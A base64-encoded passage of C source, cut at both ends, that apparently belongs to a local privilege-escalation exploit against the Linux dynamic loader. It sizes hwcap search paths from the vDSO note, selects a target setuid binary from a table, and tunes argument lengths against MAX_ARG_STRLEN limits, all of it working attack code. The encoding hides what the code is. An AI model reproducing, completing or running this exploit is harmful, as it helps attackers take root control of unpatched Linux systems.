ICAgICAgY29uc3QgdWludDY0X3QgaHdjYXAsIGNvbnN0IHVpbnQ2NF90IGh3Y2FwX21hc2ssDQogICAgICAgICAgICAgICAgICAgICBjb25zdCBzdHJ1Y3QgbXlfbGlua19tYXAgKiBzeXNpbmZvX21hcCkNCnsNCiAgc3RhdGljIGNvbnN0IHN0cnVjdCBteV9pbXBvcnRhbnRfaHdjYXBzIGVycjsNCiAgLyogRGV0ZXJtaW5lIGhvdyBtYW55IGltcG9ydGFudCBiaXRzIGFyZSBzZXQuICAqLw0KICB1aW50NjRfdCBtYXNrZWQgPSBod2NhcCAmIGh3Y2FwX21hc2s7DQogIHNpemVfdCBjbnQgPSBwbGF0Zm9ybSAhPSBOVUxMOw0KICBzaXplX3QgbiwgbTsNCiAgc2l6ZV90IHRvdGFsOw0KICBzdHJ1Y3Qgcl9zdHJsZW5wYWlyICpyZXN1bHQ7DQoNCiAgLyogQ291bnQgdGhlIG51bWJlciBvZiBiaXRzIHNldCBpbiB0aGUgbWFza2VkIHZhbHVlLiAgKi8NCiAgZm9yIChuID0gMDsgKH4oKDFVTEwgPDwgbikgLSAxKSAmIG1hc2tlZCkgIT0gMDsgKytuKQ0KICAgIGlmICgobWFza2VkICYgKDFVTEwgPDwgbikpICE9IDApDQogICAgICArK2NudDsNCg0KICAvKiBUaGUgc3lzdGVtLXN1cHBsaWVkIERTTyBjYW4gY29udGFpbiBhIG5vdGUgb2YgdHlwZSAyLCB2ZW5kb3IgIkdOVSIuDQogICAgIFRoaXMgZ2l2ZXMgdXMgYSBsaXN0IG9mIG5hbWVzIHRvIHRyZWF0IGFzIGZha2UgaHdjYXAgYml0cy4gICovDQoNCiAgY29uc3QgY2hhciAqZHNvY2FwcyA9IE5VTEw7DQogIHNpemVfdCBkc29jYXBzbGVuID0gMDsNCiAgaWYgKHN5c2luZm9fbWFwICE9IE5VTEwpDQogICAgew0KICAgICAgY29uc3QgRWxmVyhQaGRyKSAqY29uc3QgcGhkciA9IHN5c2luZm9fbWFwLT5sX3BoZHI7DQogICAgICBjb25zdCBFbGZXKFdvcmQpIHBobnVtID0gc3lzaW5mb19tYXAtPmxfcGhudW07DQogICAgICB1aW50X2Zhc3QxNl90IGk7DQogICAgICBmb3IgKGkgPSAwOyBpIDwgcGhudW07ICsraSkNCiAgICAgICAgaWYgKHBoZHJbaV0ucF90eXBlID09IFBUX05PVEUpDQogICAgICAgICAgew0KICAgICAgICAgICAgY29uc3QgRWxmVyhBZGRyKSBzdGFydCA9IChwaGRyW2ldLnBfdmFkZHINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKyBzeXNpbmZvX21hcC0+bF9hZGRyKTsNCiAgICAgICAgICAgIC8qIFRoZSBzdGFuZGFyZCBFTEYgbm90ZSBsYXlvdXQgaXMgZXhhY3RseSBhcyB0aGUgYW5vbnltb3VzIHN0cnVjdC4NCiAgICAgICAgICAgICAgIFRoZSBuZXh0IGVsZW1lbnQgaXMgYSB2YXJpYWJsZSBsZW5ndGggdmVuZG9yIG5hbWUgb2YgbGVuZ3RoDQogICAgICAgICAgICAgICBWRU5ET1JMRU4gKHdpdGggYSByZWFsIGxlbmd0aCByb3VuZGVkIHRvIEVsZlcoV29yZCkpLCBmb2xsb3dlZA0KICAgICAgICAgICAgICAgYnkgdGhlIGRhdGEgb2YgbGVuZ3RoIERBVEFMRU4gKHdpdGggYSByZWFsIGxlbmd0aCByb3VuZGVkIHRvDQogICAgICAgICAgICAgICBFbGZXKFdvcmQpKS4gICovDQogICAgICAgICAgICBjb25zdCBzdHJ1Y3QNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgRWxmVyhXb3JkKSB2ZW5kb3JsZW47DQogICAgICAgICAgICAgIEVsZlcoV29yZCkgZGF0YWxlbjsNCiAgICAgICAgICAgICAgRWxmVyhXb3JkKSB0eXBlOw0KICAgICAgICAgICAgfSAqbm90ZSA9IChjb25zdCB2b2lkICopIHN0YXJ0Ow0KICAgICAgICAgICAgd2hpbGUgKChFbGZXKEFkZHIpKSAobm90ZSArIDEpIC0gc3RhcnQgPCBwaGRyW2ldLnBfbWVtc3opDQogICAgICAgICAgICAgIHsNCiNkZWZpbmUgUk9VTkQobGVuKSAoKChsZW4pICsgc2l6ZW9mIChFbGZXKFdvcmQpKSAtIDEpICYgLXNpemVvZiAoRWxmVyhXb3JkKSkpDQogICAgICAgICAgICAgICAgLyogVGhlIGxheW91dCBvZiB0aGUgdHlwZSAyLCB2ZW5kb3IgIkdOVSIgbm90ZSBpcyBhcyBmb2xsb3dzOg0KICAgICAgICAgICAgICAgICAgIC5sb25nIDxOdW1iZXIgb2YgY2FwYWJpbGl0aWVzIGVuYWJsZWQgYnkgdGhpcyBub3RlPg0KICAgICAgICAgICAgICAgICAgIC5sb25nIDxDYXBhYmlsaXRpZXMgbWFzaz4gKGFzIG1hc2sgPj4gX0RMX0ZJUlNUX0VYVFJBKS4NCiAgICAgICAgICAgICAgICAgICAuYnl0ZSA8VGhlIGJpdCBudW1iZXIgZm9yIHRoZSBuZXh0IGNhcGFiaWxpdHk+DQogICAgICAgICAgICAgICAgICAgLmFzY2l6IDxUaGUgbmFtZSBvZiB0aGUgY2FwYWJpbGl0eT4uICAqLw0KICAgICAgICAgICAgICAgIGlmIChub3RlLT50eXBlID09IE5UX0dOVV9IV0NBUA0KICAgICAgICAgICAgICAgICAgICAmJiBub3RlLT52ZW5kb3JsZW4gPT0gc2l6ZW9mICJHTlUiDQogICAgICAgICAgICAgICAgICAgICYmICFtZW1jbXAgKChub3RlICsgMSksICJHTlUiLCBzaXplb2YgIkdOVSIpDQogICAgICAgICAgICAgICAgICAgICYmIG5vdGUtPmRhdGFsZW4gPiAyICogc2l6ZW9mIChFbGZXKFdvcmQpKSArIDIpDQogICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IEVsZlcoV29yZCkgKnAgPSAoKGNvbnN0IHZvaWQgKikgKG5vdGUgKyAxKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICsgUk9VTkQgKHNpemVvZiAiR05VIikpOw0KICAgICAgICAgICAgICAgICAgICBjbnQgKz0gKnArKzsNCiAgICAgICAgICAgICAgICAgICAgKytwOyAgICAgICAgLyogU2tpcCBtYXNrIHdvcmQuICAqLw0KICAgICAgICAgICAgICAgICAgICBkc29jYXBzID0gKGNvbnN0IGNoYXIgKikgcDsgLyogUHNldWRvLXN0cmluZyAiPGI+bmFtZSIgICovDQogICAgICAgICAgICAgICAgICAgIGRzb2NhcHNsZW4gPSBub3RlLT5kYXRhbGVuIC0gc2l6ZW9mICpwICogMjsNCiAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgbm90ZSA9ICgoY29uc3Qgdm9pZCAqKSAobm90ZSArIDEpDQogICAgICAgICAgICAgICAgICAgICAgICArIFJPVU5EIChub3RlLT52ZW5kb3JsZW4pICsgUk9VTkQgKG5vdGUtPmRhdGFsZW4pKTsNCiN1bmRlZiBST1VORA0KICAgICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoZHNvY2FwcyAhPSBOVUxMKQ0KICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICB9DQogICAgfQ0KDQogIC8qIEZvciBUTFMgZW5hYmxlZCBidWlsZHMgYWx3YXlzIGFkZCAndGxzJy4gICovDQogICsrY250Ow0KDQogIC8qIENyZWF0ZSB0ZW1wb3JhcnkgZGF0YSBzdHJ1Y3R1cmUgdG8gZ2VuZXJhdGUgcmVzdWx0IHRhYmxlLiAgKi8NCiAgaWYgKGNudCA8IDIpIHJldHVybiBlcnI7DQogIGlmIChjbnQgPj0gMzIpIHJldHVybiBlcnI7DQogIHN0cnVjdCByX3N0cmxlbnBhaXIgdGVtcFtjbnRdOw0KICBtID0gMDsNCiAgaWYgKGRzb2NhcHMgIT0gTlVMTCkNCiAgICB7DQogICAgICAvKiBkc29jYXBzIHBvaW50cyB0byB0aGUgLmFzY2l6IHN0cmluZywgYW5kIC0xIHBvaW50cyB0byB0aGUgbWFzaw0KICAgICAgICAgLmxvbmcganVzdCBiZWZvcmUgdGhlIHN0cmluZy4gICovDQogICAgICBjb25zdCBFbGZXKFdvcmQpIG1hc2sgPSAoKGNvbnN0IEVsZlcoV29yZCkgKikgZHNvY2FwcylbLTFdOw0KICAgICAgc2l6ZV90IGxlbjsNCiAgICAgIGNvbnN0IGNoYXIgKnA7DQogICAgICBmb3IgKHAgPSBkc29jYXBzOyBwIDwgZHNvY2FwcyArIGRzb2NhcHNsZW47IHAgKz0gbGVuICsgMSkNCiAgICAgICAgew0KICAgICAgICAgIHVpbnRfZmFzdDhfdCBiaXQgPSAqcCsrOw0KICAgICAgICAgIGxlbiA9IHN0cmxlbiAocCk7DQoNCiAgICAgICAgICAvKiBTa2lwIGVudHJpZXMgdGhhdCBhcmUgbm90IGVuYWJsZWQgaW4gdGhlIG1hc2sgd29yZC4gICovDQogICAgICAgICAgaWYgKG1hc2sgJiAoKEVsZlcoV29yZCkpIDEgPDwgYml0KSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgdGVtcFttXS5zdHIgPSBwOw0KICAgICAgICAgICAgICB0ZW1wW21dLmxlbiA9IGxlbjsNCiAgICAgICAgICAgICAgKyttOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgIC0tY250Ow0KICAgICAgICB9DQogICAgfQ0KICBmb3IgKG4gPSAwOyBtYXNrZWQgIT0gMDsgKytuKQ0KICAgIGlmICgobWFza2VkICYgKDFVTEwgPDwgbikpICE9IDApDQogICAgICB7DQogICAgICAgIHRlbXBbbV0uc3RyID0gbXlfaHdjYXBfc3RyaW5nIChuKTsNCiAgICAgICAgdGVtcFttXS5sZW4gPSBzdHJsZW4gKHRlbXBbbV0uc3RyKTsNCiAgICAgICAgbWFza2VkIF49IDFVTEwgPDwgbjsNCiAgICAgICAgKyttOw0KICAgICAgfQ0KICBpZiAocGxhdGZvcm0gIT0gTlVMTCkNCiAgICB7DQogICAgICB0ZW1wW21dLnN0ciA9IHBsYXRmb3JtOw0KICAgICAgdGVtcFttXS5sZW4gPSBwbGF0Zm9ybV9sZW47DQogICAgICArK207DQogICAgfQ0KDQogIHRlbXBbbV0uc3RyID0gInRscyI7DQogIHRlbXBbbV0ubGVuID0gMzsNCiAgKyttOw0KDQogIGFzc2VydCAobSA9PSBjbnQpOw0KDQogIC8qIERldGVybWluZSB0aGUgdG90YWwgc2l6ZSBvZiBhbGwgc3RyaW5ncyB0b2dldGhlci4gICovDQogIGlmIChjbnQgPT0gMSkNCiAgICB0b3RhbCA9IHRlbXBbMF0ubGVuICsgMTsNCiAgZWxzZQ0KICAgIHsNCiAgICAgIHRvdGFsID0gdGVtcFswXS5sZW4gKyB0ZW1wW2NudCAtIDFdLmxlbiArIDI7DQogICAgICBpZiAoY250ID4gMikNCiAgICAgICAgew0KICAgICAgICAgIHRvdGFsIDw8PSAxOw0KICAgICAgICAgIGZvciAobiA9IDE7IG4gKyAxIDwgY250OyArK24pDQogICAgICAgICAgICB0b3RhbCArPSB0ZW1wW25dLmxlbiArIDE7DQogICAgICAgICAgaWYgKGNudCA+IDMNCiAgICAgICAgICAgICAgJiYgKGNudCA+PSBzaXplb2YgKHNpemVfdCkgKiA4DQogICAgICAgICAgICAgICAgICB8fCB0b3RhbCArIChzaXplb2YgKCpyZXN1bHQpIDw8IDMpDQogICAgICAgICAgICAgICAgICAgICA+PSAoMVVMIDw8IChzaXplb2YgKHNpemVfdCkgKiA4IC0gY250ICsgMykpKSkNCiAgICAgICAgICAgIHJldHVybiBlcnI7DQoNCiAgICAgICAgICB0b3RhbCA8PD0gY250IC0gMzsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAvKiBUaGUgcmVzdWx0IHN0cnVjdHVyZTogd2UgdXNlIGEgdmVyeSBjb21wcmVzc2VkIHdheSB0byBzdG9yZSB0aGUNCiAgICAgdmFyaW91cyBjb21iaW5hdGlvbnMgb2YgY2FwYWJpbGl0eSBuYW1lcy4gICovDQogIGNvbnN0IHNpemVfdCBfc3ogPSAxIDw8IGNudDsNCg0KICAvKiBOb3cgd2UgYXJlIHJlYWR5IHRvIGluc3RhbGwgdGhlIHN0cmluZyBwb2ludGVycyBhbmQgbGVuZ3RoLiAgKi8NCiAgc2l6ZV90IG1heF9jYXBzdHJsZW4gPSAwOw0KICBuID0gY250Ow0KICBkbw0KICAgIHsNCiAgICAgIGNvbnN0IHNpemVfdCBtYXNrID0gMSA8PCAtLW47DQogICAgICBmb3IgKG0gPSAxIDw8IGNudDsgbSA+IDA7ICkgew0KICAgICAgICBpZiAoKC0tbSAmIG1hc2spICE9IDApDQogICAgICAgICAgbWF4X2NhcHN0cmxlbiArPSB0ZW1wW25dLmxlbiArIDE7DQogICAgICAgIGJyZWFrOw0KICAgICAgfQ0KICAgIH0NCiAgd2hpbGUgKG4gIT0gMCk7DQoNCiAgY29uc3Qgc2l6ZV90IHJvdW5kX3NpemUgPQ0KICAgICAgKDIgKiBzaXplb2YgKHN0cnVjdCByX3NlYXJjaF9wYXRoX2VsZW0pIC0gMSArIF9zeiAqIHNpemVvZiAoZW51bSByX2Rpcl9zdGF0dXMpKQ0KICAgICAgICAgLyBzaXplb2YgKHN0cnVjdCByX3NlYXJjaF9wYXRoX2VsZW0pOw0KICBpZiAoaHdjYXBfbWFzayA+IFVMT05HX01BWCkgZGllKCk7DQoNCiAgY29uc3Qgc3RydWN0IG15X2ltcG9ydGFudF9od2NhcHMgcmV0ID0gew0KICAgICAgLmh3Y2FwX21hc2sgPSBod2NhcF9tYXNrLA0KICAgICAgLm1heF9jYXBzdHJsZW4gPSBtYXhfY2Fwc3RybGVuLA0KICAgICAgLnBvaW50ZXJzID0gX3N6ICogc2l6ZW9mICgqcmVzdWx0KSwNCiAgICAgIC5zdHJpbmdzID0gdG90YWwsDQogICAgICAuc2VhcmNoX2RpcnMgPSAodGFyZ2V0LT5uc3lzdGVtX2RpcnNfbGVuICsgMSkgKiBzaXplb2YgKHN0cnVjdCByX3NlYXJjaF9wYXRoX2VsZW0gKiksDQogICAgICAuc2VhcmNoX2RpcnNfMCA9IHRhcmdldC0+c2l6ZW9mX3N5c3RlbV9kaXJzICogcm91bmRfc2l6ZSAqIHNpemVvZiAoc3RydWN0IHJfc2VhcmNoX3BhdGhfZWxlbSkNCiAgfTsNCiAgcmV0dXJuIHJldDsNCn0NCg0Kc3RhdGljIHNpemVfdA0KbXlfYnNlYXJjaChjb25zdCB2b2lkICogY29uc3Qga2V5LA0KICAgIGNvbnN0IHZvaWQgKiBjb25zdCBiYXNlLCBjb25zdCBzaXplX3Qgbm1lbWIsIGNvbnN0IHNpemVfdCBzaXplLA0KICAgIGludCAoKiBjb25zdCBjb21wYXIpKGNvbnN0IHZvaWQgKiwgY29uc3Qgdm9pZCAqKSkNCnsNCiAgICBpZiAoIWtleSkgZGllKCk7DQogICAgaWYgKCFzaXplKSBkaWUoKTsNCiAgICBpZiAoIWNvbXBhcikgZGllKCk7DQogICAgaWYgKG5tZW1iID49IFNTSVpFX01BWCAvIHNpemUpIGRpZSgpOw0KICAgIGlmICghYmFzZSAhPSAhbm1lbWIpIGRpZSgpOw0KICAgIGlmICghYmFzZSB8fCAhbm1lbWIpIHJldHVybiAwOw0KDQogICAgc2l6ZV90IGxvdyA9IDA7DQogICAgc2l6ZV90IGhpZ2ggPSBubWVtYiAtIDE7DQogICAgd2hpbGUgKGxvdyA8PSBoaWdoKSB7DQogICAgICAgIGNvbnN0IHNpemVfdCBtaWQgPSBsb3cgKyAoaGlnaCAtIGxvdykgLyAyOw0KICAgICAgICBpZiAobWlkID49IG5tZW1iKSBkaWUoKTsNCiAgICAgICAgY29uc3QgaW50IGNvbmQgPSBjb21wYXIoa2V5LCBiYXNlICsgbWlkICogc2l6ZSk7DQogICAgICAgIHN3aXRjaCAoY29uZCkgew0KICAgICAgICBjYXNlIDA6DQogICAgICAgICAgICByZXR1cm4gbWlkOw0KICAgICAgICBjYXNlIC0xOg0KICAgICAgICAgICAgaWYgKG1pZCA8PSAwKSB7DQogICAgICAgICAgICAgICAgaWYgKG1pZCAhPSAwKSBkaWUoKTsNCiAgICAgICAgICAgICAgICBpZiAobG93ICE9IDApIGRpZSgpOw0KICAgICAgICAgICAgICAgIHJldHVybiBsb3c7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBoaWdoID0gbWlkIC0gMTsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBjYXNlICsxOg0KICAgICAgICAgICAgbG93ID0gbWlkICsgMTsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgZGllKCk7DQogICAgICAgIH0NCiAgICB9DQogICAgaWYgKGxvdyA+IG5tZW1iKSBkaWUoKTsNCiAgICByZXR1cm4gbG93Ow0KfQ0KDQpzdGF0aWMgaW50DQpjbXBfaW1wb3J0YW50X2h3Y2Fwcyhjb25zdCB2b2lkICogY29uc3QgX2EsIGNvbnN0IHZvaWQgKiBjb25zdCBfYikNCnsNCiAgICBjb25zdCBzdHJ1Y3QgbXlfaW1wb3J0YW50X2h3Y2FwcyAqIGNvbnN0IGEgPSBfYTsNCiAgICBjb25zdCBzdHJ1Y3QgbXlfaW1wb3J0YW50X2h3Y2FwcyAqIGNvbnN0IGIgPSBfYjsNCg0KICAgIGlmIChhLT5zdHJpbmdzIDwgYi0+c3RyaW5ncykgcmV0dXJuIC0xOw0KICAgIGlmIChhLT5zdHJpbmdzID4gYi0+c3RyaW5ncykgcmV0dXJuICsxOw0KDQogICAgaWYgKGEtPnBvaW50ZXJzIDwgYi0+cG9pbnRlcnMpIHJldHVybiAtMTsNCiAgICBpZiAoYS0+cG9pbnRlcnMgPiBiLT5wb2ludGVycykgcmV0dXJuICsxOw0KDQogICAgaWYgKGEtPnNlYXJjaF9kaXJzXzAgPCBiLT5zZWFyY2hfZGlyc18wKSByZXR1cm4gLTE7DQogICAgaWYgKGEtPnNlYXJjaF9kaXJzXzAgPiBiLT5zZWFyY2hfZGlyc18wKSByZXR1cm4gKzE7DQoNCiAgICBpZiAoYS0+bWF4X2NhcHN0cmxlbiA8IGItPm1heF9jYXBzdHJsZW4pIHJldHVybiAtMTsNCiAgICBpZiAoYS0+bWF4X2NhcHN0cmxlbiA+IGItPm1heF9jYXBzdHJsZW4pIHJldHVybiArMTsNCg0KICAgIHJldHVybiAwOw0KfQ0KDQpzdHJ1Y3QgYXVkaXRfbGlzdA0Kew0KICBjb25zdCBjaGFyICpuYW1lOw0KICBzdHJ1Y3QgYXVkaXRfbGlzdCAqbmV4dDsNCn07DQoNCmludA0KbWFpbihjb25zdCBpbnQgbXlfYXJnYywgY29uc3QgY2hhciAqIGNvbnN0IG15X2FyZ3ZbXSwgY29uc3QgY2hhciAqIGNvbnN0IG15X2VudnBbXSkNCnsNCiAgew0KICAgIGNvbnN0IGNoYXIgKiBjb25zdCAqIHAgPSBteV9lbnZwOw0KICAgIHdoaWxlICgqcCsrKSA7DQogICAgbXlfYXV4diA9IChjb25zdCB2b2lkICopcDsNCiAgfQ0KICAgIGlmIChteV9nZXRhdXh2YWwoQVRfUEFHRVNaKSAhPSBQQUdFU1opIGRpZSgpOw0KICB7DQogICAgc3RydWN0IHRpbWV2YWwgdHY7DQogICAgaWYgKGdldHRpbWVvZmRheSgmdHYsIE5VTEwpKSBkaWUoKTsNCiAgICBzcmFuZG9tKGdldHBpZCgpIF4gdHYudHZfc2VjIF4gdHYudHZfdXNlYyk7DQogIH0NCiAgICBpZiAobXlfYXJnYyAhPSAxKzIpIHsNCiAgICAgICAgcHJpbnRmKCJVc2FnZTogJXMgdGFyZ2V0IGJpbmFyeVxuIiwgbXlfYXJndlswXSk7DQogICAgICAgIHNpemVfdCBpOw0KICAgICAgICBmb3IgKGkgPSAwOyBpIDwgc2l6ZW9mKHRhcmdldHMpL3NpemVvZigqdGFyZ2V0cyk7IGkrKykgew0KICAgICAgICAgICAgcHJpbnRmKCJUYXJnZXQgJXp1ICVzXG4iLCBpLCB0YXJnZXRzW2ldLm5hbWUpOw0KICAgICAgICB9DQogICAgICAgIGRpZSgpOw0KICAgIH0NCiAgew0KICAgIGNvbnN0IHNpemVfdCBpID0gc3RydG91bChteV9hcmd2WzFdLCBOVUxMLCAxMCk7DQogICAgaWYgKGkgPj0gc2l6ZW9mKHRhcmdldHMpL3NpemVvZigqdGFyZ2V0cykpIGRpZSgpOw0KICAgIHRhcmdldCA9IHRhcmdldHMgKyBpOw0KICAgIHByaW50ZigiVGFyZ2V0ICV6dSAlc1xuIiwgaSwgdGFyZ2V0LT5uYW1lKTsNCiAgfQ0KICAgIHByaW50ZigibWF1ICV6dSBuc2QgJXp1IHNzZCAlenUgcmwgJXMgaWwgJWQgaW8gJWRcbiIsDQogICAgICAgIHRhcmdldC0+bWVtYWxpZ25fdXAsIHRhcmdldC0+bnN5c3RlbV9kaXJzX2xlbiwgdGFyZ2V0LT5zaXplb2Zfc3lzdGVtX2RpcnMsDQogICAgICAgIHRhcmdldC0+cmVwbF9saWIsIHRhcmdldC0+aWdub3JlX2xpYiwgdGFyZ2V0LT5pZ25vcmVfb3JpZ2luKTsNCg0KICAgIGlmICh0YXJnZXQtPm1lbWFsaWduX3VwICUgUEFHRVNaKSBkaWUoKTsNCiAgICBpZiAodGFyZ2V0LT5pZ25vcmVfbGliIDwgMCB8fCB0YXJnZXQtPmlnbm9yZV9vcmlnaW4gPCAwKSBkaWUoKTsNCiAgICBpZiAodGFyZ2V0LT5pZ25vcmVfbGliID4gMSB8fCB0YXJnZXQtPmlnbm9yZV9vcmlnaW4gPiAxKSBkaWUoKTsNCg0KICAgIGNvbnN0IGNoYXIgKiBjb25zdCBiaW5hcnkgPSByZWFscGF0aChteV9hcmd2WzJdLCBOVUxMKTsNCiAgICBpZiAoIWJpbmFyeSkgZGllKCk7DQogICAgaWYgKCpiaW5hcnkgIT0gJy8nKSBkaWUoKTsNCiAgICBpZiAoYWNjZXNzKGJpbmFyeSwgWF9PSykpIGRpZSgpOw0KDQogICAgY29uc3QgY2hhciAqIGNvbnN0IHNsYXNoID0gc3RycmNocihiaW5hcnksICcvJyk7DQogICAgaWYgKCFzbGFzaCkgZGllKCk7DQogICAgaWYgKHNsYXNoIDw9IGJpbmFyeSkgZGllKCk7DQogICAgY29uc3QgY2hhciAqIGNvbnN0IG9yaWdpbiA9IHN0cm5kdXAoYmluYXJ5LCBzbGFzaCAtIGJpbmFyeSk7DQogICAgaWYgKCFvcmlnaW4pIGRpZSgpOw0KICAgIHByaW50Zigib3JpZ2luICVzICglenUpXG4iLCBvcmlnaW4sIHN0cmxlbihvcmlnaW4pKTsNCg0KICAgIGNvbnN0IGNoYXIgKiBjb25zdCBwbGF0Zm9ybSA9IChjb25zdCB2b2lkICopbXlfZ2V0YXV4dmFsKEFUX1BMQVRGT1JNKTsNCiAgICBpZiAoIXBsYXRmb3JtKSBkaWUoKTsNCiAgICBjb25zdCBzaXplX3QgcGxhdGZvcm1fbGVuID0gc3RybGVuKHBsYXRmb3JtKTsNCiAgICBpZiAocGxhdGZvcm1fbGVuICE9IDQpIGRpZSgpOw0KICB7DQogICAgc2l6ZV90IGk7DQogICAgZm9yIChpID0gMDsgOyBpKyspIHsNCiAgICAgICAgaWYgKGkgPj0gc2l6ZW9mKG15X3g4Nl9wbGF0Zm9ybXMpIC8gc2l6ZW9mKG15X3g4Nl9wbGF0Zm9ybXNbMF0pKSBkaWUoKTsNCiAgICAgICAgaWYgKHN0cmNtcChwbGF0Zm9ybSwgbXlfeDg2X3BsYXRmb3Jtc1tpXSkgPT0gMCkgYnJlYWs7DQogICAgfQ0KICB9DQogICAgY29uc3Qgc3RydWN0IHsNCiAgICAgICAgY29uc3QgY2hhciAqIHN0cjsNCiAgICAgICAgc2l6ZV90IGxlbjsNCiAgICAgICAgc2l6ZV90IHJlcGxfbGVuOw0KICAgIH0gRFNUc1tdID0gew0KICAgICAgICAjZGVmaW5lIERTVF9MSUIgIkxJQiINCiAgICAgICAgeyBEU1RfTElCLCBzdHJsZW4oRFNUX0xJQiksIHN0cmxlbih0YXJnZXQtPnJlcGxfbGliKSB9LA0KICAgICAgICAjZGVmaW5lIERTVF9QTEFURk9STSAiUExBVEZPUk0iDQogICAgICAgIHsgRFNUX1BMQVRGT1JNLCBzdHJsZW4oRFNUX1BMQVRGT1JNKSwgcGxhdGZvcm1fbGVuIH0NCiAgICB9Ow0KICAgIHNpemVfdCByZXBsX21heCA9IHRhcmdldC0+aWdub3JlX29yaWdpbiA/IDAgOiBzdHJsZW4ob3JpZ2luKTsNCiAgew0KICAgIHNpemVfdCBpOw0KICAgIGZvciAoaSA9IHRhcmdldC0+aWdub3JlX2xpYiA/IDEgOiAwOyBpIDwgc2l6ZW9mKERTVHMpL3NpemVvZigqRFNUcyk7IGkrKykgew0KICAgICAgICBpZiAocmVwbF9tYXggPCBEU1RzW2ldLnJlcGxfbGVuKQ0KICAgICAgICAgICAgcmVwbF9tYXggPSBEU1RzW2ldLnJlcGxfbGVuOw0KICAgIH0NCiAgfQ0KICAgIHByaW50ZigicmVwbF9tYXggJXp1XG4iLCByZXBsX21heCk7DQogICAgaWYgKHJlcGxfbWF4IDwgNCkgZGllKCk7DQoNCiAgICBjb25zdCBFbGZXKEVoZHIpICogY29uc3Qgc3lzaW5mb19kc28gPSAoY29uc3Qgdm9pZCAqKW15X2dldGF1eHZhbChBVF9TWVNJTkZPX0VIRFIpOw0KICAgIGlmICghc3lzaW5mb19kc28pIGRpZSgpOw0KICAgIHN0cnVjdCBteV9saW5rX21hcCBzeXNpbmZvX21hcCA9IHsNCiAgICAgICAgLmxfcGhkciA9IChjb25zdCB2b2lkICopc3lzaW5mb19kc28gKyBzeXNpbmZvX2Rzby0+ZV9waG9mZiwNCiAgICAgICAgLmxfcGhudW0gPSBzeXNpbmZvX2Rzby0+ZV9waG51bSwNCiAgICAgICAgLmxfYWRkciA9IFVMT05HX01BWA0KICAgIH07DQogIHsNCiAgICB1aW50X2Zhc3QxNl90IGk7DQogICAgZm9yIChpID0gMDsgaSA8IHN5c2luZm9fbWFwLmxfcGhudW07ICsraSkgew0KICAgICAgICBjb25zdCBFbGZXKFBoZHIpICogY29uc3QgcGggPSAmc3lzaW5mb19tYXAubF9waGRyW2ldOw0KICAgICAgICBpZiAocGgtPnBfdHlwZSA9PSBQVF9MT0FEKSB7DQogICAgICAgICAgICBpZiAoc3lzaW5mb19tYXAubF9hZGRyID09IFVMT05HX01BWCkNCiAgICAgICAgICAgICAgICBzeXNpbmZvX21hcC5sX2FkZHIgPSBwaC0+cF92YWRkcjsNCiAgICAgICAgfQ0KICAgIH0NCiAgfQ0KICAgIGlmIChzeXNpbmZvX21hcC5sX2FkZHIgPT0gVUxPTkdfTUFYKSBkaWUoKTsNCiAgICBzeXNpbmZvX21hcC5sX2FkZHIgPSAoRWxmVyhBZGRyKSlzeXNpbmZvX2RzbyAtIHN5c2luZm9fbWFwLmxfYWRkcjsNCg0KICAgIGNvbnN0IHVuc2lnbmVkIGxvbmcgaHdjYXAgPSBteV9nZXRhdXh2YWwoQVRfSFdDQVApOw0KICAgIGlmICghaHdjYXApIGRpZSgpOw0KICAgIHN0cnVjdCBteV9pbXBvcnRhbnRfaHdjYXBzICogaW1wb3J0YW50X2h3Y2FwcyA9IE5VTEw7DQogICAgc2l6ZV90IG51bV9pbXBvcnRhbnRfaHdjYXBzID0gMDsNCiAgew0KICAgIHNpemVfdCBtYXhfaW1wb3J0YW50X2h3Y2FwcyA9IDA7DQogICAgdWludDMyX3QgaHdjYXBfbWFzayA9IDE7DQogICAgZG8gew0KICAgICAgICBpZiAoaHdjYXBfbWFzayAmIH5od2NhcCkgY29udGludWU7DQogICAgICAgIGNvbnN0IHVpbnQ2NF90IHBvcGNvdW50ID0gX19idWlsdGluX3BvcGNvdW50KGh3Y2FwX21hc2spOw0KICAgICAgICBpZiAocG9wY291bnQgPCAxKSBkaWUoKTsNCiAgICAgICAgaWYgKHBvcGNvdW50ID4gMzIpIGRpZSgpOw0KICAgICAgICBpZiAoKCgoMisxKSAqICgyKjIgKyBwb3Bjb3VudCkpIDw8IChwb3Bjb3VudC0xKSkgKyBQQUdFU1oNCiAgICAgICAgICAgID49IE1BWF9BUkdfU1RSTEVOICsgKE1BWF9BUkdfU1RSTEVOIC8gKDQrMSkpICogKHJlcGxfbWF4IC0gKHRhcmdldC0+aWdub3JlX2xpYiA/IDcgOiA0KSkpIGNvbnRpbnVlOw0KDQogICAgICAgIGNvbnN0IHN0cnVjdCBteV9pbXBvcnRhbnRfaHdjYXBzIGloYyA9IG15X2ltcG9ydGFudF9od2NhcHMocGxhdGZvcm0sIHBsYXRmb3JtX2xlbiwgaHdjYXAsIGh3Y2FwX21hc2ssICZzeXNpbmZvX21hcCk7DQogICAgICAgIGlmICghaWhjLnBvaW50ZXJzKSBkaWUoKTsNCg0KICAgICAgICBjb25zdCBzaXplX3QgaWR4ID0gbXlfYnNlYXJjaCgmaWhjLCBpbXBvcnRhbnRfaHdjYXBzLCBudW1faW1wb3J0YW50X2h3Y2Fwcywgc2l6ZW9mKHN0cnVjdCBteV9pbXBvcnRhbnRfaHdjYXBzKSwgY21wX2ltcG9ydGFudF9od2NhcHMpOw0KICAgICAgICBpZiAoaWR4ID4gbnVtX2ltcG9ydGFudF9od2NhcHMpIGRpZSgpOw0KDQogICAgICAgIGlmIChpZHggPT0gbnVtX2ltcG9ydGFudF9od2NhcHMgfHwgY21w